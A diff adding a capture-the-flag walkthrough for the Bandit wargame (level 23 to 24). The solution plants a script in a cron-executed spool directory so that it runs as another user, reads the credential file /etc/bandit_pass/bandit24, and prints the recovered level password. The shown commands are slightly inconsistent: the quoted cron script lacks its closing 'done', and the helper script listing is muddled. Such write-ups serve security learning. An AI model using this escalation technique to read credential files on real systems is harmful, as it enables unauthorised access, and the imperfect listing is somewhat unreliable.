@@ -1148,3 +1148,54 @@ The cron job revealed that `/usr/bin/cronjob_bandit23.sh` runs every minute as u
 
 ---
 
+## Level 23 → Level 24
+
+**Goal:** A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+**Commands used:** cron, crontab, crontab(5) (use “man 5 crontab” to access this)
+
+**Solution:**
+
+```bash
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+shopt -s nullglob
+
+myname=$(whoami)
+
+cd /var/spool/"$myname"/foo || exit 
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+
+bandit23@bandit:~$ chmod 777 /tmp/mydir
+bandit23@bandit:~$ chmod 777 /tmp/mydir/getpass.sh
+bandit23@bandit:~$ cat /tmp/mydir/getpass.sh
+
+#!/bin/bash
+
+echo '#!/bin/bash' > /tmp/mydir/getpass.sh
+echo 'cat /etc/bandit_pass/bandit24 > /tmp/mydir/password.txt' >> /tmp/mydir/getpass.sh
+bandit23@bandit:~$ cp /tmp/mydir/getpass.sh /var/spool/bandit24/foo/
+bandit23@bandit:~$ sleep 60 && cat /tmp/mydir/password.txt
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+```
+**Password for the next level:** hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+
